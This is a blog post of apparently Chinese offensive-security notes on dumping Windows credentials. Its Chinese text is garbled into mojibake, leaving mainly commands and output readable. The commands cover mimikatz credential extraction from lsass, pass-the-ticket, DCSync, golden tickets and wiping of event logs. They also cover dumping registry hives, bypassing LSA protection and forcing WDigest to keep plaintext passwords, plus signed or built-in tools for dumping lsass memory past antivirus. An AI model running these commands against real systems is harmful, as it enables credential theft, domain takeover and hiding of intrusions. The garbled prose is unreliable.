---
layout: post
title: Windows æœ¬åœ°è½¬å‚¨å‡­è¯
category: Windows
tags: [dump credentials, mimikatz, impacket-secretsdump]
---

ç”±äºå¡å·´æ–¯åŸºï¼ˆKasperskyï¼‰ã€å°çº¢ä¼ï¼ˆAvira Antivirusï¼‰ç­‰æ€è½¯å‡å¯¹ lsass.exe è¿›ç¨‹è¿›è¡Œäº†ä¿æŠ¤ï¼Œä¼šå¯¼è‡´å¾®è½¯çš„å·¥å…·ä»¥åŠå·´æ–¯åŸºçš„ kldumper.exe éƒ½æ— æ³•æˆåŠŸè½¬å‚¨ lsass.exe å†…å­˜çš„æƒ…å†µã€‚

> æ³¨ï¼šä»»ç„¶å¯ä»¥é€šè¿‡åˆ¶é€ è“å±æ¥è·å–æ‰€æœ‰å†…å­˜çš„æ–‡ä»¶ MEMORY.DMP ç„¶åå†æå‡º lsass è¿›ä¸€æ­¥è¯»å–ã€‚

## Mimikatz

### privilege module

è¯·æ±‚è¿›ç¨‹[è°ƒè¯•ç‰¹æƒ](https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/debug-privilege)ï¼šï¼ˆè®¸å¤š Mimikatz å‘½ä»¤éƒ½éœ€è¦æ­¤ç‰¹æƒï¼‰

```console
mimikatz # privilege::debug
Privilege '20' OK
```

Remark: ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061 means that the required privilege is not held by the client (mostly you're not an administrator ğŸ˜)

> æ³¨ï¼šè°ƒè¯•ç‰¹æƒæ˜¯ä¸€ç§å®‰å…¨ç­–ç•¥è®¾ç½®ï¼Œå…è®¸ç”¨æˆ·å°†è°ƒè¯•å™¨é™„åŠ åˆ°è¿›ç¨‹æˆ–å†…æ ¸ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå…·æœ‰ç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·å¯ç”¨æ­¤å±æ€§ã€‚

### sekurlsa module

è¯¥æ¨¡å—ä» lsass (Local Security Authority Subsystem Service) çš„å†…å­˜ä¸­æå–å¯†ç ã€å¯†é’¥ã€PIN ç ã€ç¥¨æ®ã€‚

-   [sekurlsa::Ekeys](https://adsecurity.org/?page_id=1821#SEKURLSAEkeys) â€“ åˆ—å‡º Kerberos å¯†é’¥
-   [sekurlsa::Kerberos](https://adsecurity.org/?page_id=1821#SEKURLSAKerberos) â€“ åˆ—å‡ºæ‰€æœ‰å·²é€šè¿‡è®¤è¯çš„ç”¨æˆ·çš„ Kerberos å‡­è¯ï¼ˆåŒ…æ‹¬æœåŠ¡å¸æˆ·å’Œè®¡ç®—æœºå¸æˆ·ï¼‰
-   [sekurlsa::Krbtgt](https://adsecurity.org/?page_id=1821#SEKURLSAKrbtgt) â€“ è·å–åŸŸä¸­ Kerberos æœåŠ¡å¸æˆ·ï¼ˆKRBTGTï¼‰çš„å¯†ç æ•°æ®
-   [sekurlsa::logonpasswords](https://adsecurity.org/?page_id=1821#SEKURLSALogonPasswords) â€“ åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„æä¾›è€…çš„å‡­æ®ã€‚è¿™ä¸ªå‘½ä»¤é€šå¸¸ä¼šæ˜¾ç¤ºæœ€è¿‘ç™»å½•è¿‡çš„ç”¨æˆ·å’Œæœ€è¿‘ç™»å½•è¿‡çš„è®¡ç®—æœºçš„å‡­è¯ã€‚

ä»ç¦»çº¿å†…å­˜è½¬å‚¨æ–‡ä»¶ï¼ˆlsass.dmpï¼‰ä¸­è·å–å¯†ç ï¼š

```
mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP
mimikatz # sekurlsa::logonPasswords full
```

mimikatz æ”¯æŒä¼ å…¥å‚æ•°ä½¿ç”¨ï¼Œè¿™æ ·ä½¿ç”¨èµ·æ¥æ›´æ–¹ä¾¿ï¼š

```
mimikatz.exe "log" "privilege::debug" "sekurlsa::logonpasswords full" "exit"
```

### ticket

æŸ¥çœ‹ç¥¨æ®ï¼š

```
kerberos::list
```

å¯¼å‡ºæ‰€æœ‰ç¥¨æ®ï¼š

```
sekurlsa::tickets /export
or
kerberos::list /export
```

> æ³¨ï¼šä¸ kerberos::list ä¸åŒçš„æ˜¯ sekurlsa ä½¿ç”¨å†…å­˜è¯»å–çš„æ–¹å¼ï¼Œå®ƒä¸ä¼šå—åˆ°å¯†é’¥å¯¼å‡ºçš„é™åˆ¶ã€‚

æ¸…é™¤ç¥¨æ®ï¼š

```
kerberos::purge
```

å¯¼å…¥ç¥¨æ®åˆ°å†…å­˜ä¸­ï¼š

```
# ptt (pass the ticket)
kerberos::ptt [0;1622d8]-2-0-60a00000-Administrator@krbtgt-XIAORANG.LAB.krbtgt

# ptc (pass the cache)
kerberos::ptc m3g9tr0n@HACKLAB.LOCAL_krbtgt~HACKLAB.LOCAL@HACKLAB.LOCAL.ccache
```

è·å–åˆ° DC æœåŠ¡çš„ç¥¨æ®åï¼Œåˆ©ç”¨ dscync å¯¼å‡º dc çš„ hashï¼š

```
lsadump::dcsync /domain:XIAORANG.LAB /all /csv
```

DCSync è·å–æŒ‡å®šç”¨æˆ·çš„å“ˆå¸Œï¼š

```
lsadump::dcsync /user:Administrator /domain:example.com
```

ä½¿ç”¨ krbtgt è´¦æˆ·å‡­æ®ï¼Œç”Ÿæˆé»„é‡‘ç¥¨æ®å¹¶å¯¼å…¥å†…å­˜ä¸­ï¼šï¼ˆ/ptt å°†ç¥¨æ®åŠ è½½åˆ°å†…å­˜ä¸­ï¼‰

```
kerberos::golden /krbtgt:8a4f49ff2d2eedf30b5e565e4332d0b5/user:administrator /domain:example.com /sid:S-1-5-21-2604854395-1602356619-879117556-502 /ptt
```

ä½¿ç”¨ krbtgt è´¦æˆ·å‡­æ®ï¼Œç”Ÿæˆé»„é‡‘ç¥¨æ®å¹¶ä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼šï¼ˆ/ticket å°†ç¥¨æ®ä»¥æŒ‡å®šçš„æ–‡ä»¶åä¿å­˜åˆ°ç£ç›˜ä¸Šï¼‰

```
kerberos::golden /krbtgt:8a4f49ff2d2eedf30b5e565e4332d0b5 /admin:administrator /domain:example.com /sid:S-1-5-21-2604854395-1602356619-879117556-502 /ticket:administrator.ticket.bin
```

### event module

`event::drop`ï¼špatch äº‹ä»¶æœåŠ¡ï¼Œä»¥é¿å…æ–°äº‹ä»¶äº§ç”Ÿ

`event::clear`ï¼šæ¸…é™¤äº‹ä»¶æ—¥å¿—

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # event::drop
"EventLog" service patched

mimikatz # event::clear
Using "Security" event log :
- 2312 event(s)
- Cleared !
- 0 event(s)

mimikatz #
```

> è¿è¡Œ `privilege::debug`ï¼Œç„¶åè¿è¡Œ `event::drop` ä»¥ patch äº‹ä»¶æ—¥å¿—ã€‚ç„¶åè¿è¡Œ `event::Clear` æ¸…é™¤äº‹ä»¶æ—¥å¿—ï¼Œä¸è®°å½•ä»»ä½•æ—¥å¿—æ¸…é™¤äº‹ä»¶ï¼ˆ1102ï¼‰ã€‚

`/log`ï¼šæŒ‡å®šè¦æ¸…é™¤çš„äº‹ä»¶æ—¥å¿—ã€‚é»˜è®¤çš„æ˜¯ Security æ—¥å¿—ã€‚

```
mimikatz # event::clear /log:System
Using "System" event log :
- 3865 event(s)
- Cleared !
- 0 event(s)
```

## Dump Credentials from the Windows Registry

è½¬å‚¨ SAM & SYSTEM æ³¨å†Œè¡¨ï¼š

```
reg save hklm\sam sam.hive
reg save hklm\system system.hive
reg save hklm\security security.hive
```

ä½¿ç”¨ impacket-secretsdump ä»æ³¨å†Œè¡¨æ–‡ä»¶ä¸­è·å–å“ˆå¸Œï¼š

```
root@kali-server:~# impacket-secretsdump -sam sam.hive -system system.hive LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x4d1852164a0b068f32110659820cd4bc
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64d4b4314b59fb051020a12f09effcac:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

ä¹Ÿå¯ä»¥ä½¿ç”¨ mimikatz ä»æ³¨å†Œè¡¨è½¬å‚¨æ–‡ä»¶ä¸­è¯»å–å“ˆå¸Œï¼š

```
mimikatz # lsadump::sam /sam:c:\temp\sam.hive /system:c:\temp\system.hive
```

## LSA Protection

LSA åŒ…å«æœ¬åœ°å®‰å…¨æœºæ„æœåŠ¡å™¨æœåŠ¡ (LSASS) è¿›ç¨‹ï¼Œå¯ä»¥éªŒè¯ç”¨æˆ·çš„æœ¬åœ°å’Œè¿œç¨‹ç™»å½•ï¼Œå¹¶å¼ºåˆ¶æœ¬åœ°å®‰å…¨ç­–ç•¥ã€‚Windows 8.1ã€Windows Server 2012 æ“ä½œç³»ç»Ÿå’Œæ›´é«˜ç‰ˆæœ¬ä¸º LSA æä¾›é¢å¤–çš„ä¿æŠ¤ï¼Œä»¥é˜²æ­¢éå—ä¿æŠ¤çš„è¿›ç¨‹è¯»å–å†…å­˜å’Œä»£ç æ³¨å…¥ã€‚å¦‚æœ LSASS è¢«æ ‡è®°ä¸º Protected Process Light (PPL)ï¼Œåˆ™ä¿æŠ¤å·²æ‰“å¼€ã€‚è¯¦æƒ…è§å¾®è½¯å®˜æ–¹æ–‡æ¡£ï¼š[é…ç½®å…¶ä»– LSA ä¿æŠ¤](https://learn.microsoft.com/zh-cn/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)

å¼€å¯ LSA ä¿æŠ¤ï¼šï¼ˆé‡å¯ç”Ÿæ•ˆï¼‰

```
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "RunAsPPL" /t REG_DWORD /d "00000001" /f
```

ç¦ç”¨ LSA ä¿æŠ¤ï¼šï¼ˆé‡å¯ç”Ÿæ•ˆï¼‰

```
reg delete HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA v RunAsPPL f
```

> å½“æ­¤è®¾ç½®ä¸â€œUEFI é”å®šâ€å’Œâ€œå®‰å…¨å¯åŠ¨â€ä¸€èµ·ä½¿ç”¨æ—¶ï¼Œç”±äºç¦ç”¨â€œHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsaâ€æ³¨å†Œè¡¨é¡¹ä¸èµ·ä½œç”¨ï¼Œå› æ­¤å¯ä»¥å®ç°é¢å¤–çš„ä¿æŠ¤ã€‚

åœ¨å¼€å¯ LSA ä¿æŠ¤çš„æƒ…å†µä¸‹ï¼Œæ­¤æ—¶ mimikatz æ— æ³•ä» LSASS è¿›ç¨‹ä¸­è½¬å‚¨å‡­æ®ï¼ŒæŠ¥é”™ç¤ºä¾‹ï¼š

```
mimikatz # sekurlsa::msv
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)

mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::logonPasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
```

ä½¿ç”¨ mimikatz - lsadump::lsa æ¨¡å—ï¼ˆæ¨èï¼‰ï¼Œå¯ä»¥åœ¨æœ¬åœ°å®‰å…¨è®¤è¯ï¼ˆLocal Security Authorityï¼‰ä¸Šç›´æ¥è¯»å–å‡­æ®ï¼š

```
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject
mimikatz # lsadump::lsa /patch
```

mimikatz åœ¨ 2013 å¹´ 10 æœˆå°±å·²æ”¯æŒç»•è¿‡ LSA Protectionã€‚mimikatz ä¸­çš„ mimidrv.sys é©±åŠ¨ç¨‹åºï¼Œå¯ä» lsass.exe è¿›ç¨‹ä¸­åˆ é™¤ LSA ä¿æŠ¤ï¼šï¼ˆå¯èƒ½ä¸æˆåŠŸï¼Œå»ºè®®ä½¿ç”¨ `lsadump::lsa` æ¨¡å—ï¼‰

```
mimikatz# privilege::debug
mimikatz# !+
mimikatz# !processprotect /process:lsass.exe /remove
mimikatz# sekurlsa::logonpasswords
......
mimikatz# !-
```

å…¶å®ƒç»•è¿‡æˆ–å…³é—­ LSA ä¿æŠ¤çš„å·¥å…·ï¼š[https://github.com/RedCursorSecurityConsulting/PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller)

## WDigest Auth

Microsoft å‘å¸ƒäº†ä¸€ä¸ªè¡¥ä¸[KB2871997](https://blogs.technet.microsoft.com/srd/2014/06/05/an-overview-of-kb2871997/)ï¼Œå®‰è£…æ­¤è¡¥ä¸åï¼Œå…è®¸ç”¨æˆ·åœ¨æ³¨å†Œè¡¨ä¸­é…ç½®ä¸€ä¸ªè®¾ç½®ï¼ˆé«˜ç‰ˆæœ¬å·²é»˜è®¤é…ç½®ï¼‰ç¦ç”¨ WDigest èº«ä»½éªŒè¯ï¼Œä»è€Œé˜²æ­¢å°†æ˜æ–‡å¯†ç å­˜å‚¨åœ¨å†…å­˜ä¸­ã€‚æ­¤æ—¶ mimikatz ç”¨æŠ“å–æ—¶å¯†ç å­—æ®µä¼šæ˜¾ç¤ºä¸º nullã€‚

> ä½œä¸º WDigest èº«ä»½éªŒè¯æä¾›ç¨‹åºçš„ä¸€éƒ¨åˆ†ï¼ŒWindows 8 å’Œ 2012 ä¹‹å‰çš„ç‰ˆæœ¬é»˜è®¤ä»¥æ˜æ–‡å½¢å¼åœ¨å†…å­˜ä¸­å­˜å‚¨ç™»å½•å‡­æ®ï¼Œè€Œè¾ƒæ–°çš„ Windows ç‰ˆæœ¬ä¸å†æ˜¯è¿™ç§æƒ…å†µã€‚

å®‰è£…æ­¤å®‰å…¨æ›´æ–°åï¼Œå¯ä»¥ä½¿ç”¨æ³¨å†Œè¡¨è®¾ç½®æ¥æ§åˆ¶å¦‚ä½•ä¿å­˜å·²å®‰è£…çš„ WDigest å‡­æ®ã€‚
å¼ºåˆ¶ WDigest ä»¥æ˜æ–‡å½¢å¼å­˜å‚¨å‡­æ®ï¼šï¼ˆåœ¨ä¸‹æ¬¡æœ‰äººç™»å½•åˆ°ç›®æ ‡ç³»ç»Ÿæ—¶ä»¥æ˜æ–‡å½¢å¼å­˜å‚¨å‡­æ®ï¼‰

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

-   å¦‚æœ UseLogonCredential å€¼è®¾ç½®ä¸º 0ï¼ŒWDigest å°†ä¸ä¼šåœ¨å†…å­˜ä¸­å­˜å‚¨å‡­æ®ã€‚
-   å¦‚æœ UseLogonCredential å€¼è®¾ç½®ä¸º 1ï¼ŒWDigest ä¼šå°†å‡­æ®å­˜å‚¨åœ¨å†…å­˜ä¸­ã€‚

> é…ç½® WDigest ä»¥æ˜æ–‡å½¢å¼å­˜å‚¨å‡­æ®åï¼Œè·å–ç”¨æˆ·çš„ä¼‘çœ é”å±æœºåˆ¶ï¼ŒæŸ¥çœ‹ç”¨æˆ·æ¡Œé¢å·²ç»æœ‰å¤šä¹…æ²¡æœ‰æ´»åŠ¨äº†ï¼Œåœ¨åˆé€‚çš„æ—¶é—´è°ƒç”¨é”å±è®©ç›®æ ‡è¾“å…¥ç™»å½•å¯†ç ã€‚

```
# é”å±
rundll32 user32.dll,LockWorkStation

# æ³¨é”€ç™»å½•ç”¨æˆ·
logoff <Session ID>

# å¦‚æœç­‰å¾…ï¼Œä¹Ÿå¯ä»¥å¼ºåˆ¶ç™»å½•è®©å…¶ä¸‹çº¿è¿«ä½¿å…¶è¾“å…¥å¯†ç 
cme smb 17.10.0.10  -u administrator -p -H <hash> -x quser
cme smb 17.10.0.10  -u administrator -p -H <hash> -m mimikatz.py -x quser
```

> [https://github.com/wh0nsq/BypassCredGuard](https://github.com/wh0nsq/BypassCredGuard)

## å…¶å®ƒå‡­æ®è½¬å‚¨å·¥å…·

> [https://blog.jd.army/2022/10/10/Lsass%20memory%20dump/](https://blog.jd.army/2022/10/10/Lsass%20memory%20dump/)

### PwDump

[PwDump 7 for Windows](https://www.tarasco.org/security/pwdump_7/)

### procdump

[procdump](https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump) æ˜¯å¾®è½¯å®˜æ–¹å‘å¸ƒçš„å·¥å…·ï¼Œä½¿ç”¨è¯¥å·¥å…·å¯ä»¥æŠŠ lsass çš„å†…å­˜ dump ä¸‹æ¥ï¼Œå¯ä»¥ç»•è¿‡å¤§å¤šæ•°çš„é˜²æŠ¤è½¯ä»¶ã€‚

### Sqldumper

SQLDumper æ˜¯ Microsoft SQL Server ç¨‹åºçš„ä¸€éƒ¨åˆ†ï¼Œä¸»è¦æ˜¯ä¸ºäº†è°ƒè¯• SQL Server å’Œç›¸å…³è¿›ç¨‹çš„å†…å­˜ã€‚é»˜è®¤å­˜æ”¾åœ¨ï¼š`C:\Program Files\Microsoft SQL Server\<SQLServeVersionNumber>\Shared`ï¼Œå¦‚æœç›®æ ‡æœºå™¨æ²¡æœ‰å®‰è£… SQL Server ï¼Œä¸Šä¼ ä¸ª`SqlDumper.exe`å³å¯ã€‚

æŸ¥è¯¢ lsass.exe è¿›ç¨‹çš„ pidï¼š

```
tasklist /svc |findstr lsass.exe
```

å®Œæ•´è½¬å‚¨æ–‡ä»¶ï¼š

```
Sqldumper.exe <ProcessID> 0 0x01100
```

å¾®å‹è½¬å‚¨æ–‡ä»¶ï¼š

```
Sqldumper.exe <ProcessID> 0 0x0120
```

> Sqldumper çš„å…¶å®ƒä½¿ç”¨æ–¹æ³•è§ï¼š[ä½¿ç”¨ Sqldumper.exe ç”Ÿæˆè½¬å‚¨æ–‡ä»¶ - SQL Server](https://learn.microsoft.com/zh-cn/troubleshoot/sql/tools/use-sqldumper-generate-dump-file)

### AvDump

[AvDump](https://www.pconlife.com/viewfileinfo/avdump64-exe/) æ˜¯ Avast æ€æ¯’è½¯ä»¶ä¸­è‡ªå¸¦çš„ä¸€ä¸ªç¨‹åºï¼Œå¯ç”¨äºè½¬å‚¨æŒ‡å®šè¿›ç¨‹ï¼ˆlsass.exeï¼‰å†…å­˜æ•°æ®ï¼Œå› ä¸ºå®ƒå¸¦æœ‰ Avast æ€è½¯æ•°å­—ç­¾åï¼Œæ‰€ä»¥ä¸ä¼šè¢«åç—…æ¯’æ£€æµ‹å’ŒæŸ¥æ€

```
.\avdump64.exe --pid <lsass pid> --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file C:\ProgramData\lsass.dmp
```

### Process Explorer

Process Explorer ä¹Ÿæ˜¯æ˜¯ SysInternal å›¢é˜Ÿå¼€å‘çš„ windows è¿›ç¨‹ç›‘æ§å·¥å…·ï¼Œæ­¤å·¥å…·ä¸»è¦å¯¹ windows çš„è¿›ç¨‹è¿›è¡Œç›‘æ§ï¼ŒåŒ…æ‹¬è¿›ç¨‹ç›¸å…³æ–‡ä»¶ã€è¿›ç¨‹å±æ€§ã€è¿›ç¨‹çŠ¶æ€ç­‰è¿›è¡Œç›‘æ§ã€‚åœ¨æ­¤å·¥å…·çš„æ­£å¸¸åŠŸèƒ½ä¸­ï¼Œéœ€è¦å¯¹è¿›ç¨‹å†…å­˜è¿›è¡Œ dumpï¼Œæ¥æŸ¥çœ‹è¿›ç¨‹è¿è¡Œè¿‡ç¨‹ä¸­çš„å†…å­˜ã€‚
æ­¤å·¥å…·ç›´æ¥é€šè¿‡å›¾å½¢ç•Œé¢æ¥åˆ›å»º dump æ–‡ä»¶ã€‚
![image.png](https://cdn.nlark.com/yuque/0/2023/png/12358123/1674453743784-26b153ee-5f33-41aa-91a0-e419ee80c756.png#averageHue=%23242323&clientId=uf9299405-c287-4&from=paste&height=552&id=ub7295974&originHeight=885&originWidth=1186&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54074&status=done&style=none&taskId=u3f098ca1-edc8-4e70-a92a-20bc3265795&title=&width=739.3246936383109)

### ProcessDump

[æ€ç§‘ Cisco Jabber](https://www.webex.com/downloads/jabber.html) ä¼šåœ¨ `C:\Program Files (x86)\Cisco Systems\Cisco Jabber\x64\ProcessDump.exe` jabber ä¼šä½¿ç”¨æ­¤ç¨‹åºæ¥è¿›è¡Œå†…å­˜è½¬å‚¨ã€‚

```
processdump.exe (ps lsass).id c:\lsass.dmp
```

### Process-Dump

[https://github.com/glmcdona/Process-Dump](https://github.com/glmcdona/Process-Dump)

### Comsvcs.dll

æ­¤æ–¹æ³•ä¸»è¦æ˜¯é€šè¿‡ rundll32 æ¥è°ƒç”¨ comsvcs.dll ä¸­çš„ MiniDump æ¥ç›´æ¥ dump ç›¸å…³å†…å­˜ã€‚
MiniDumpW é€šè¿‡ OpenProcess+CreateFileW+MiniDumpWriteDump å‡½æ•°æ¥ dump å†…å­˜ã€‚

```
rundll32 C:\windows\system32\comsvcs.dll MiniDump "<LsassPid> dump.bin full"
```

> éœ€è¦ç”¨æˆ·æœ‰ SeDebugPrivilege ç‰¹æƒã€‚powershell ä¸­ç®¡ç†å‘˜é»˜è®¤æ‹¥æœ‰ï¼Œcmd ä¸‹åˆ™æ²¡æœ‰è¯¥ç‰¹æƒã€‚

### rdrleakdiag

è¯¥ç¨‹åºæ˜¯ windows è‡ªå¸¦çš„ Microsoft Windows Resource Leak Diagnosticï¼Œä¸»è¦ç”¨äº windows è¯Šæ–­ç›¸å…³èµ„æºæ³„éœ²ï¼Œå®ƒé»˜è®¤å®‰è£…åœ¨ windows7ã€windows8ã€windows10ã€windows server2012 ä»¥ä¸Šä¸­ã€‚

```
rdrleakdiag.exe /p <LsassPid> /O C:\ /fullmemdmp /wait 1
```

ç­‰è¿‡ä¸ªä¸€åˆ†é’Ÿï¼ŒC ç›˜ä¸‹å°±ä¼šæœ‰ä¸ªè½¬å‚¨æ–‡ä»¶ï¼š`minidump_<LsassPid>.dmp`

### kldumper

ä½¿ç”¨å¡å·´æ–¯åŸºçš„ [kldumper.exe](https://github.com/TheKingOfDuck/hashdump/tree/master/kldumper) è½¬å‚¨è¿›ç¨‹å†…å­˜ï¼š

```
kldumper.exe klserver.exe c:\klserver.dmp
```

> å‚è€ƒï¼šhttps://support.kaspersky.com/us/ksc/14.2/diagnostics/7641
